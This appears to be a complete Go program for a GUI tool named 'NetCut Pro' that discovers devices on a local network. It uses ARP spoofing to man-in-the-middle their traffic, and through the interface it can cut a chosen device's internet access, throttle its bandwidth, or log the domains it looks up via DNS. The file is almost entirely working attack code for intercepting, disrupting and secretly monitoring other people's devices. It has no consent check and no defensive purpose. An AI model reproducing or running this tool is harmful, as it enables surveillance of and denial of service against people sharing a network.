package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"sort"
	"strings"
	"sync"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// --- 1. DATA STRUCTURES ---

type Device struct {
	IP        string
	MAC       string
	Hostname  string
	Vendor    string
	Platform  string // Icon (📱, 💻)
	BytesSent uint64
	BytesRecv uint64
	LastSeen  time.Time

	VisitedSites []string // Sniffer Logs

	IsCut          bool
	IsLimited      bool
	IsSniffing     bool
	BandwidthLimit uint64
	bucketTokens   float64
	lastBucketRef  time.Time
}

type NetManager struct {
	devices       map[string]*Device
	activeTargets map[string]bool
	mu            sync.RWMutex

	ifaceName  string
	localIP    string
	localMAC   string
	gatewayIP  string
	gatewayMAC string

	handle *pcap.Handle
}

var nm *NetManager

// --- 2. MAIN ENTRY ---

func main() {
	// 1. Setup App
	myApp := app.New()
	w := myApp.NewWindow(fmt.Sprintf("NetCut Pro (%s)", runtime.GOOS))
	w.Resize(fyne.NewSize(1100, 650))

	// 2. Check Permissions
	if !checkPrivileges() {
		dialog.ShowError(fmt.Errorf("Permission Denied!\n\nLinux: Run with 'sudo -E ./app'\nWindows: Run as Administrator"), w)
		w.SetOnClosed(func() { os.Exit(1) })
		w.ShowAndRun()
		return
	}

	// 3. Init Manager
	nm = &NetManager{
		devices:       make(map[string]*Device),
		activeTargets: make(map[string]bool),
	}

	// --- GUI COMPONENTS ---

	statusLabel := widget.NewLabel("Status: Ready. Please Scan.")
	statusLabel.TextStyle = fyne.TextStyle{Bold: true}

	var displayIPs []string

	// DEVICE LIST
	deviceList := widget.NewList(
		func() int {
			nm.mu.RLock()
			defer nm.mu.RUnlock()
			return len(displayIPs)
		},
		func() fyne.CanvasObject {
			// Row: Type | IP | Hostname | Vendor | Usage | Status | Logs | Action
			return container.NewGridWithColumns(8,
				widget.NewLabel("📱"),                                      // 0 Type
				widget.NewLabel("192.168.1.1"),                            // 1 IP
				widget.NewLabel("Hostname"),                               // 2 Hostname
				widget.NewLabel("Vendor"),                                 // 3 Vendor
				widget.NewLabel("0 MB"),                                   // 4 Usage
				widget.NewLabel("Active"),                                 // 5 Status
				widget.NewButtonWithIcon("", theme.VisibilityIcon(), nil), // 6 Log
				widget.NewButton("Action", nil),                           // 7 Action
			)
		},
		func(i widget.ListItemID, o fyne.CanvasObject) {
			nm.mu.RLock()
			if i >= len(displayIPs) {
				nm.mu.RUnlock()
				return
			}
			ip := displayIPs[i]
			dev := nm.devices[ip]
			nm.mu.RUnlock()

			if dev == nil {
				return
			}

			c := o.(*fyne.Container)

			// Set Data
			c.Objects[0].(*widget.Label).SetText(dev.Platform)
			c.Objects[1].(*widget.Label).SetText(dev.IP)
			c.Objects[2].(*widget.Label).SetText(truncate(dev.Hostname, 15))
			c.Objects[3].(*widget.Label).SetText(dev.Vendor)

			mb := float64(dev.BytesSent+dev.BytesRecv) / 1024.0 / 1024.0
			c.Objects[4].(*widget.Label).SetText(fmt.Sprintf("%.2f MB", mb))

			// Status & Log
			lblStatus := c.Objects[5].(*widget.Label)
			btnLog := c.Objects[6].(*widget.Button)
			btnAct := c.Objects[7].(*widget.Button)

			btnLog.OnTapped = func() { showLogWindow(myApp, dev) }

			if dev.IsCut {
				lblStatus.SetText("🔴 BLOCKED")
				btnAct.SetText("Restore")
				btnAct.Importance = widget.HighImportance
				btnAct.OnTapped = func() { go releaseDevice(dev.IP) }
			} else if dev.IsLimited {
				lblStatus.SetText(fmt.Sprintf("⚡ %d KB/s", dev.BandwidthLimit))
				btnAct.SetText("Unlimit")
				btnAct.Importance = widget.WarningImportance
				btnAct.OnTapped = func() { go releaseDevice(dev.IP) }
			} else if dev.IsSniffing {
				lblStatus.SetText("👀 Sniffing")
				btnAct.SetText("Stop")
				btnAct.Importance = widget.HighImportance
				btnAct.OnTapped = func() { go releaseDevice(dev.IP) }
			} else {
				lblStatus.SetText("🟢 Active")
				btnAct.SetText("Control")
				btnAct.Importance = widget.DangerImportance
				btnAct.OnTapped = func() { showControlDialog(w, dev.IP) }
			}
		},
	)

	refreshUI := func() {
		nm.mu.Lock()
		displayIPs = make([]string, 0, len(nm.devices))
		for ip := range nm.devices {
			displayIPs = append(displayIPs, ip)
		}
		sort.Strings(displayIPs)
		nm.mu.Unlock()
		deviceList.Refresh()
	}

	// TOOLBAR
	toolbar := widget.NewToolbar(
		widget.NewToolbarAction(theme.SearchIcon(), func() {
			statusLabel.SetText("Status: Initializing Network...")
			go func() {
				if err := initNetwork(); err != nil {
					statusLabel.SetText("Error: " + err.Error())
					return
				}
				statusLabel.SetText("Status: Scanning...")
				scanNetwork()
				statusLabel.SetText(fmt.Sprintf("Scan Complete. Found %d devices.", len(nm.devices)))
				refreshUI()
			}()
		}),
		widget.NewToolbarSpacer(),
		widget.NewToolbarAction(theme.ContentClearIcon(), func() {
			go cleanup()
			statusLabel.SetText("Status: Limits Released.")
			refreshUI()
		}),
	)

	// HEADERS
	header := container.NewGridWithColumns(8,
		headerLabel("Type"), headerLabel("IP Addr"), headerLabel("Hostname"),
		headerLabel("Vendor"), headerLabel("Data"), headerLabel("Status"),
		headerLabel("Sniffer"), headerLabel("Control"),
	)

	content := container.NewBorder(
		container.NewVBox(toolbar, statusLabel, header),
		nil, nil, nil,
		deviceList,
	)

	// Live Update Ticker
	go func() {
		for range time.Tick(1 * time.Second) {
			deviceList.Refresh()
		}
	}()

	w.SetContent(content)
	w.SetOnClosed(func() { cleanup(); os.Exit(0) })
	w.ShowAndRun()
}

func headerLabel(text string) *widget.Label {
	l := widget.NewLabel(text)
	l.TextStyle = fyne.TextStyle{Bold: true}
	return l
}

func truncate(s string, n int) string {
	if len(s) > n {
		return s[:n] + ".."
	}
	return s
}

// --- 3. GUI POPUPS ---

func showLogWindow(app fyne.App, dev *Device) {
	w := app.NewWindow("Sniffer: " + dev.IP)
	w.Resize(fyne.NewSize(400, 500))

	var sites []string
	list := widget.NewList(
		func() int { return len(sites) },
		func() fyne.CanvasObject { return widget.NewLabel("template.com") },
		func(i widget.ListItemID, o fyne.CanvasObject) {
			if i < len(sites) {
				o.(*widget.Label).SetText(sites[i])
			}
		},
	)

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		for {
			select {
			case <-ticker.C:
				nm.mu.RLock()
				sites = make([]string, 0, len(dev.VisitedSites))
				// Reverse order (newest top)
				for i := len(dev.VisitedSites) - 1; i >= 0; i-- {
					sites = append(sites, dev.VisitedSites[i])
				}
				nm.mu.RUnlock()
				list.Refresh()
			}
		}
	}()
	w.SetContent(container.NewBorder(nil, nil, nil, nil, list))
	w.Show()
}

func showControlDialog(parent fyne.Window, ip string) {
	cutBtn := widget.NewButton("✂️ Cut Internet", func() {
		go blockDevice(ip)
		parent.Content().Refresh()
	})
	cutBtn.Importance = widget.DangerImportance

	entry := widget.NewEntry()
	entry.SetPlaceHolder("KB/s (e.g. 50)")

	limitBtn := widget.NewButton("⚡ Limit", func() {
		var l uint64
		fmt.Sscanf(entry.Text, "%d", &l)
		if l > 0 {
			go limitDevice(ip, l)
		}
		parent.Content().Refresh()
	})

	sniffBtn := widget.NewButton("👀 Sniff Traffic", func() {
		go sniffDevice(ip)
		parent.Content().Refresh()
	})

	dialog.ShowCustom("Manage "+ip, "Cancel", container.NewVBox(
		widget.NewLabel("Action:"), cutBtn, sniffBtn,
		widget.NewSeparator(),
		widget.NewLabel("Speed Limit:"), entry, limitBtn,
	), parent)
}

func sniffDevice(ip string) {
	nm.mu.Lock()
	d := nm.devices[ip]
	nm.mu.Unlock()
	if d == nil {
		return
	}
	d.IsCut = false
	d.IsLimited = false
	d.IsSniffing = true
	go startMITM(ip)
}

// --- 4. NETWORK & CORE LOGIC ---

func checkPrivileges() bool {
	if runtime.GOOS != "windows" {
		return os.Geteuid() == 0
	}
	// Windows check (try open physical drive)
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	return err == nil
}

func getGatewayIP() (string, error) {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("route", "print", "0.0.0.0")
		out, err := cmd.Output()
		if err != nil {
			return "", err
		}
		lines := strings.Split(string(out), "\n")
		for _, line := range lines {
			fields := strings.Fields(line)
			if len(fields) > 4 && fields[0] == "0.0.0.0" {
				return fields[2], nil
			}
		}
		return "", fmt.Errorf("gateway not found")
	}
	// Linux
	cmd := exec.Command("ip", "route", "show", "default")
	out, err := cmd.Output()
	if err != nil {
		return "", err
	}
	fields := strings.Fields(string(out))
	if len(fields) > 2 {
		return fields[2], nil
	}
	return "", fmt.Errorf("gateway not found")
}

func initNetwork() error {
	if nm.handle != nil {
		return nil
	} // Already done

	gw, err := getGatewayIP()
	if err != nil {
		return err
	}
	nm.gatewayIP = gw

	// Find Interface
	devices, err := pcap.FindAllDevs()
	if err != nil {
		return err
	}
	found := false
	for _, d := range devices {
		for _, address := range d.Addresses {
			ip := address.IP.To4()
			if ip != nil && !ip.IsLoopback() {
				if isSameSubnet(ip.String(), nm.gatewayIP) {
					nm.ifaceName = d.Name
					nm.localIP = ip.String()
					found = true
					break
				}
			}
		}
		if found {
			break
		}
	}
	if !found {
		return fmt.Errorf("no interface found for gateway %s", nm.gatewayIP)
	}

	// Get MAC
	ifaces, _ := net.Interfaces()
	for _, i := range ifaces {
		addrs, _ := i.Addrs()
		for _, a := range addrs {
			if strings.Contains(a.String(), nm.localIP) {
				nm.localMAC = i.HardwareAddr.String()
			}
		}
	}

	handle, err := pcap.OpenLive(nm.ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		return err
	}
	nm.handle = handle

	// Add Self
	v, p := getVendorAndPlatform(nm.localMAC)
	nm.devices[nm.localIP] = &Device{
		IP: nm.localIP, MAC: nm.localMAC, Hostname: "My-Device", Vendor: v, Platform: p, LastSeen: time.Now(),
	}

	// Resolve Gateway MAC
	gwMac, err := resolveMAC(nm.gatewayIP)
	if err != nil {
		nm.gatewayMAC = "ff:ff:ff:ff:ff:ff"
	} else {
		nm.gatewayMAC = gwMac
	}

	// Start Engine
	go processTrafficLoop()
	return nil
}

func isSameSubnet(ip1, ip2 string) bool {
	p1 := strings.Split(ip1, ".")
	p2 := strings.Split(ip2, ".")
	if len(p1) == 4 && len(p2) == 4 {
		return p1[0] == p2[0] && p1[1] == p2[1] && p1[2] == p2[2]
	}
	return false
}

func scanNetwork() {
	ip := net.ParseIP(nm.localIP).To4()
	baseIP := fmt.Sprintf("%d.%d.%d", ip[0], ip[1], ip[2])
	// Fast Scan
	for i := 1; i < 255; i++ {
		t := fmt.Sprintf("%s.%d", baseIP, i)
		if t == nm.localIP {
			continue
		}
		go sendARP(t, "00:00:00:00:00:00", nm.localIP, nm.localMAC, layers.ARPRequest)
		time.Sleep(1 * time.Millisecond)
	}
	time.Sleep(2 * time.Second)
}

func resolveMAC(ip string) (string, error) {
	h, err := pcap.OpenLive(nm.ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		return "", err
	}
	defer h.Close()
	h.SetBPFFilter("arp")

	sendARPWithHandle(h, ip, "00:00:00:00:00:00", nm.localIP, nm.localMAC, layers.ARPRequest)
	src := gopacket.NewPacketSource(h, h.LinkType())
	timeout := time.After(2 * time.Second)

	for {
		select {
		case p := <-src.Packets():
			if arp := p.Layer(layers.LayerTypeARP); arp != nil {
				a := arp.(*layers.ARP)
				if net.IP(a.SourceProtAddress).String() == ip {
					return net.HardwareAddr(a.SourceHwAddress).String(), nil
				}
			}
		case <-timeout:
			return "", fmt.Errorf("timeout")
		}
	}
}
func processTrafficLoop() {
	src := gopacket.NewPacketSource(nm.handle, nm.handle.LinkType())
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}

	localMAC, _ := net.ParseMAC(nm.localMAC)
	gatewayMAC, _ := net.ParseMAC(nm.gatewayMAC)

	for p := range src.Packets() {
		ethL := p.Layer(layers.LayerTypeEthernet)
		if ethL == nil {
			continue
		}
		eth := ethL.(*layers.Ethernet)
		ipL := p.Layer(layers.LayerTypeIPv4)
		if ipL == nil {
			continue
		}
		ip := ipL.(*layers.IPv4)

		srcIP := ip.SrcIP.String()
		dstIP := ip.DstIP.String()
		size := uint64(len(p.Data()))

		nm.mu.Lock()
		// Discovery
		if _, ok := nm.devices[srcIP]; !ok {
			v, plat := getVendorAndPlatform(eth.SrcMAC.String())
			newD := &Device{IP: srcIP, MAC: eth.SrcMAC.String(), Vendor: v, Platform: plat, Hostname: "...", LastSeen: time.Now()}
			nm.devices[srcIP] = newD
			go func(d *Device) {
				name := getHostname(d.IP)
				nm.mu.Lock()
				d.Hostname = name
				nm.mu.Unlock()
			}(newD)
		}

		if d, ok := nm.devices[srcIP]; ok {
			d.BytesSent += size
			d.LastSeen = time.Now()
		}
		if d, ok := nm.devices[dstIP]; ok {
			d.BytesRecv += size
			d.LastSeen = time.Now()
		}

		// Sniffing
		if d, ok := nm.devices[srcIP]; ok && p.Layer(layers.LayerTypeDNS) != nil {
			dns := p.Layer(layers.LayerTypeDNS).(*layers.DNS)
			if !dns.QR && len(dns.Questions) > 0 {
				dom := strings.TrimSuffix(string(dns.Questions[0].Name), ".")
				if len(d.VisitedSites) == 0 || d.VisitedSites[len(d.VisitedSites)-1] != dom {
					d.VisitedSites = append(d.VisitedSites, dom)
					if len(d.VisitedSites) > 50 {
						d.VisitedSites = d.VisitedSites[1:]
					}
				}
			}
		}

		// MITM
		var t *Device
		var upload bool

		// --- FIXED SECTION START ---
		if nm.activeTargets[srcIP] {
			t = nm.devices[srcIP]
			upload = true
		} else if nm.activeTargets[dstIP] {
			t = nm.devices[dstIP]
			upload = false
		}
		// --- FIXED SECTION END ---

		nm.mu.Unlock()

		if t == nil || srcIP == nm.localIP || dstIP == nm.localIP {
			continue
		}
		if t.IsCut {
			continue
		} // Drop

		if t.IsLimited {
			limit := float64(t.BandwidthLimit) * 1024
			now := time.Now()
			elap := now.Sub(t.lastBucketRef).Seconds()
			t.bucketTokens += elap * limit
			if t.bucketTokens > limit {
				t.bucketTokens = limit
			}
			t.lastBucketRef = now

			needed := float64(size)
			if t.bucketTokens >= needed {
				t.bucketTokens -= needed
			} else {
				wait := (needed - t.bucketTokens) / limit
				time.Sleep(time.Duration(wait * float64(time.Second)))
				t.bucketTokens = 0
				t.lastBucketRef = time.Now()
			}
		}

		if upload {
			eth.SrcMAC = localMAC
			eth.DstMAC = gatewayMAC
		} else {
			tm, _ := net.ParseMAC(t.MAC)
			eth.SrcMAC = localMAC
			eth.DstMAC = tm
		}

		buf.Clear()
		gopacket.SerializeLayers(buf, opts, eth, ip, gopacket.Payload(ip.Payload))
		nm.handle.WritePacketData(buf.Bytes())
	}
}

// --- ACTIONS ---

func blockDevice(ip string) {
	nm.mu.Lock()
	d := nm.devices[ip]
	nm.mu.Unlock()
	if d == nil {
		return
	}
	d.IsCut = true
	d.IsLimited = false
	go startMITM(ip)
}

func limitDevice(ip string, l uint64) {
	nm.mu.Lock()
	d := nm.devices[ip]
	nm.mu.Unlock()
	if d == nil {
		return
	}
	d.IsCut = false
	d.IsLimited = true
	d.BandwidthLimit = l
	d.bucketTokens = float64(l * 1024)
	d.lastBucketRef = time.Now()
	go startMITM(ip)
}

func releaseDevice(ip string) {
	nm.mu.Lock()
	d := nm.devices[ip]
	delete(nm.activeTargets, ip)
	nm.mu.Unlock()
	if d != nil {
		d.IsCut = false
		d.IsLimited = false
		d.IsSniffing = false
		sendARP(ip, d.MAC, nm.gatewayIP, nm.gatewayMAC, layers.ARPReply)
		sendARP(nm.gatewayIP, nm.gatewayMAC, ip, d.MAC, layers.ARPReply)
	}
}

func startMITM(ip string) {
	nm.mu.Lock()
	if nm.activeTargets[ip] {
		nm.mu.Unlock()
		return
	}
	nm.activeTargets[ip] = true
	d := nm.devices[ip]
	nm.mu.Unlock()

	// ARP Burst (Optimization: Force quick update)
	go func() {
		for i := 0; i < 5; i++ {
			nm.mu.RLock()
			if !nm.activeTargets[ip] {
				nm.mu.RUnlock()
				return
			}
			nm.mu.RUnlock()
			sendARP(ip, d.MAC, nm.gatewayIP, nm.localMAC, layers.ARPReply)
			sendARP(nm.gatewayIP, nm.gatewayMAC, ip, nm.localMAC, layers.ARPReply)
			time.Sleep(100 * time.Millisecond)
		}
	}()

	tick := time.NewTicker(2 * time.Second)
	for {
		nm.mu.RLock()
		act := nm.activeTargets[ip]
		nm.mu.RUnlock()
		if !act {
			return
		}
		sendARP(ip, d.MAC, nm.gatewayIP, nm.localMAC, layers.ARPReply)
		sendARP(nm.gatewayIP, nm.gatewayMAC, ip, nm.localMAC, layers.ARPReply)
		<-tick.C
	}
}

func sendARP(dstIP, dstMAC, srcIP, srcMAC string, op uint16) {
	sendARPWithHandle(nm.handle, dstIP, dstMAC, srcIP, srcMAC, op)
}

func sendARPWithHandle(h *pcap.Handle, dstIP, dstMAC, srcIP, srcMAC string, op uint16) {
	sM, _ := net.ParseMAC(srcMAC)
	dM, _ := net.ParseMAC(dstMAC)
	sI := net.ParseIP(srcIP).To4()
	dI := net.ParseIP(dstIP).To4()
	eth := layers.Ethernet{SrcMAC: sM, DstMAC: dM, EthernetType: layers.EthernetTypeARP}
	arp := layers.ARP{
		AddrType: layers.LinkTypeEthernet, Protocol: layers.EthernetTypeIPv4, HwAddressSize: 6, ProtAddressSize: 4, Operation: op,
		SourceHwAddress: sM, SourceProtAddress: sI, DstHwAddress: dM, DstProtAddress: dI,
	}
	buf := gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buf, gopacket.SerializeOptions{}, &eth, &arp)
	if h != nil {
		h.WritePacketData(buf.Bytes())
	}
}

func cleanup() {
	nm.mu.Lock()
	for ip := range nm.activeTargets {
		delete(nm.activeTargets, ip)
	}
	nm.mu.Unlock()
}

// --- VENDOR & HOSTNAME ---

func getHostname(ip string) string {
	names, err := net.LookupAddr(ip)
	if err == nil && len(names) > 0 {
		return strings.TrimSuffix(names[0], ".")
	}
	return "Unknown"
}

func getVendorAndPlatform(mac string) (string, string) {
	clean := strings.ToUpper(strings.ReplaceAll(mac, ":", ""))
	if len(clean) < 6 {
		return "Unknown", "❓"
	}
	prefix := clean[0:6]

	// Simplified Vendor DB
	vendors := map[string]string{
		"000C29": "VMware", "005056": "VMware",
		"B827EB": "Raspberry Pi", "DCA632": "Raspberry Pi",
		"001B21": "Intel", "0024D7": "Intel",
		"00E04C": "Realtek", "5404A6": "Realtek",
		"18C04D": "Dell", "F01FAF": "Dell",
		"3C5282": "HP", "FC15B4": "HP",
		"806E6F": "MSI", "D43D7E": "Micro-Star",
		"30C3D9": "Samsung", "50F5DA": "Samsung", "24F5AA": "Samsung",
		"94FB29": "Xiaomi", "F8A2D6": "Xiaomi",
		"A47733": "Google Pixel",
		"F4F5DB": "Apple", "BC926B": "Apple", "1C36BB": "Apple", "28CFE9": "Apple",
		"6045BD": "TP-Link", "AC84C6": "TP-Link",
	}

	v, ok := vendors[prefix]
	if !ok {
		return "Generic", "🔌"
	}

	switch v {
	case "Apple":
		return "Apple", "🍎"
	case "Samsung", "Xiaomi", "Google Pixel":
		return v, "📱"
	case "Intel", "Realtek", "Dell", "HP", "MSI", "VMware":
		return v, "💻"
	case "Raspberry Pi":
		return v, "📟"
	default:
		return v, "❓"
	}
}
